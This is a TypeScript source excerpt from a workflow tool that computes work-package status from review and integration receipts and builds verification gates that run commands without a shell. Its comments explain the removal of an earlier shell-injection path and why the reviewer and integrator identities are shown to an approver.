       * no receipt file was ever written — this falls back to that event so history is not broken.
       */
      const receiptsForExecution = (loadedAckReceipts.receipts.get(workPackage.id) ?? [])
        .filter((receipt) => receipt.executionId === delivery.execution_id);
      const reviewed = lifecycle.some((event) => event.eventType === 'work-package.reviewed')
        || receiptsForExecution.some((receipt) => receipt.status === 'reviewed');
      const integrated = lifecycle.some((event) => event.eventType === 'work-package.integrated')
        || receiptsForExecution.some((receipt) => receipt.status === 'integrated');
      if (reviewed) status = 'reviewed';
      else if (integrated) status = 'integrated';
      else status = 'succeeded';
      /*
       * Who reviewed and who integrated, reported rather than judged.
       *
       * A live Major run wrote the Spec, the Design, every line of code, the check report and the
       * assurance from one executor, and no Stage ever asked for a second opinion — the Reviewer
       * role existed in the Scaffold and was never required. Requiring the acknowledgement is
       * enforceable and now is. Requiring the two identities to *differ* is not: the same session
       * can name any actor it likes, so a check that pretended to verify independence would be
       * asserting something it cannot know. Surfacing both names lets an approver see it and
       * decide, which is the same posture `declaredBy` and `decidedBy` take elsewhere.
       */
      acknowledgements = {
        reviewedBy: receiptsForExecution.find((receipt) => receipt.status === 'reviewed')?.actor?.id ?? null,
        integratedBy: receiptsForExecution.find((receipt) => receipt.status === 'integrated')?.actor?.id ?? null,
      };
    }
    else if (delivery?.status === 'failed' || invalidDeliveries.has(workPackage.id)) status = 'failed';
    else if (delivery?.status === 'blocked') status = 'blocked';
    else if (dispatch) status = 'running';
    else status = missingDependencies.length === 0 ? 'ready' : 'blocked';
    return { ...workPackage, status, missingDependencies, delivery, acknowledgements };
  });

  if (options.requireDeliveries) {
    for (const workPackage of packageStates) {
      if (!['succeeded', 'integrated', 'reviewed'].includes(workPackage.status)) {
        diagnostics.push(diagnostic(
          'XFORGE_WORK_PACKAGE_INCOMPLETE',
          `Work package ${workPackage.id} is ${workPackage.status}; a valid succeeded delivery is required.`,
          planPath,
        ));
      }
    }
  }

  return {
    status: 'resolved',
    state: {
      path: planPath,
      baseCommit,
      ready: packageStates.filter((item) => item.status === 'ready').map((item) => item.id),
      waves: executionWaves(plan.packages),
      parallelCandidates: packageStates.filter((item) => item.status === 'ready').map((item) => item.id),
      protectedWritePaths: protectedPaths,
      unattributedPaths: [...unattributedPaths].sort(),
      packages: packageStates,
    },
    diagnostics,
  };
}

export interface WorkPackageVerificationGate {
  packageId: string;
  command: string;
  gate: GateResource;
}

/**
 * Turns each package's `verify` entries into Gates `check` can run.
 *
 * `shell: false` and a real argv are the whole point: the synthesized Gate is built in code, so it
 * never passes through schema validation, and until now it was built with `command: [theWholeString]`
 * and `shell: true` — which `runners/gate.ts` hands to `spawn(command[0], [], { shell: true })`,
 * i.e. `/bin/sh -c <plan content>`. See the `VerifyEntry` comment for how that string reached the
 * machine in the first place.
 *
 * An entry that cannot be turned into an argv is skipped rather than approximated. It is already an
 * error from `resolveWorkPackages`, and `commands/check.ts` does not reach this function while
 * structural errors exist, so skipping is unreachable in practice — it exists so that this function
 * is safe read on its own, without depending on a caller's ordering to stay that way.
 */
export function workPackageVerificationGates(state: WorkPackagePlanState): WorkPackageVerificationGate[] {
  const result: WorkPackageVerificationGate[] = [];
  for (const workPackage of state.packages) {
    const entries = normalizeVerify(workPackage);
    for (let index = 0; index < entries.length; index += 1) {
      const entry = entries[index]!;
      if (entry.problem || !entry.argv.length) continue;
      const slug = workPackage.id.toLowerCase().replace(/[^a-z0-9-]+/g, '-').replace(/^-|-$/g, '') || 'package';
      result.push({
        packageId: workPackage.id,
        command: entry.label,
        gate: {
          apiVersion: 'xforge.dev/v1alpha1',
          kind: 'Gate',
          metadata: { name: `work-package-${slug}-${index + 1}`, version: 1 },
          spec: {
            required: true,
            command: entry.argv,
            shell: false,
            workingDirectory: '.',
            timeoutSeconds: WORK_PACKAGE_VERIFY_TIMEOUT_SECONDS,
            maxOutputBytes: MAX_GATE_OUTPUT_BYTES,
            evidence: `agents/${workPackage.id}/verify-${index + 1}.json`,
          },
        },
      });
    }
  }
  return result;
}
